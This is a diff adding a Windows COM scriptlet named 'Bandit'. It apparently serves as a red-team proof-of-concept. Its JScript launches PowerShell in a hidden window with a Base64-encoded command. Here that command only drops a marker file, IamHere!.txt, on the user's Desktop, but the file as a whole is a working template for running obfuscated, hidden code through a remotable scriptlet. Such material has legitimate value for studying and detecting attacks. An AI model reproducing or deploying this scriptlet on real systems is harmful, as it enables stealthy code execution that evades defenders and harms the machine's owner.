@@ -1,0 +1,24 @@
+<?XML version="1.0"?>
+<scriptlet>
+
+<registration
+    description="Bandit"
+    progid="Bandit"
+    version="1.00"
+    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
+    remotable="true"
+	>
+</registration>
+
+<script language="JScript">
+
+<![CDATA[
+	
+	var objShell = new ActiveXObject("WScript.Shell");
+	
+	objShell.Exec("PowerShell.exe -NoP -sta -NonI -W Hidden -Enc JABmAGkAbABlAFAAYQB0AGgAIAA9ACAAJABlAG4AdgA6AFUAUwBFAFIAUABSAE8ARgBJAEwARQAgACsAIAAiAFwARABlAHMAawB0AG8AcABcAEkAYQBtAEgAZQByAGUAIQAuAHQAeAB0ACIAOwAgACQAYwBvAG4AdABlAG4AdAAgAD0AIAAgACIASABlAGwAbABvACAAVwBvAHIAbABkACAAIQAgAGAAbgAiADsAIAAkAGMAbwBuAHQAZQBuAHQAIAB8ACAATwB1AHQALQBGAGkAbABlACAAJABmAGkAbABlAFAAYQB0AGgAOwA=");
+]]>
+
+</script>
+
+</scriptlet>
